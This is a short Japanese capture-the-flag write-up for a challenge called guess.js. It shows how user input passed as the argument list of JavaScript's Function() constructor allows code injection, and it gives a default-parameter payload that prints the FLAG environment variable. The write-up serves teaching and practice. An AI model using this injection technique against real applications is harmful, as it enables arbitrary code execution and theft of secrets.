# guess.js

## / Overview

Functionコンストラクタの引数RCE

## / Writeup

問題の核心は以下の部分です。

```js
rl.question("> ") // Guess the SECRET!
  .then((guess) =>
    Function(
      guess,
      `
        if (${SECRET} === 1337) {
          return process.env.FLAG;
        } else {
          return "Failed...";
        }
      `,
    )(1337),
  )
```

流れとしては

1. 標準入力を受け取る
2. `Function(guess, ...)`のguessに標準入力の値を代入する
3. 代入後の関数の第一引数を`1337`として実行する

となっています。

この`Function`という式は**Function() コンストラクター**というものです。[公式ドキュメント](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Function/Function)を見ると、次のような記述があります。

> 引数は関数式と同様に解釈できるため、空白やコメントも受け入れられます。例えば、`"x", "theValue = 42", "[a, b] /* 数値 */"`、または `"x, theValue = 42, [a, b] /* 数値 */"` です。

つまり、`guess`に入力する文字列に`,`を含めることで引数を分割できるということです。これを踏まえて以下のペイロードを入力します。

```js
x, y = console.log(process.env.FLAG)
```

これを代入すると

- arg: `x, y = console.log(process.env.FLAG)`
- functionBody: `if (${SECRET} === 1337) {
        return process.env.FLAG;
    } else {
        return "Failed...";
    }`

となります。別の形で書くと

```js
function(x, y = console.log(process.env.FLAG)) {
    if (${SECRET} === 1337) {
        return process.env.FLAG;
    } else {
        return "Failed...";
    }
}
```

です。この後に`x`には`1337`が代入されますが、`y`には何も代入されません。そのため`y`には右辺のデフォルト値である`console.log(process.env.FLAG)`が評価され、フラグが出力されます。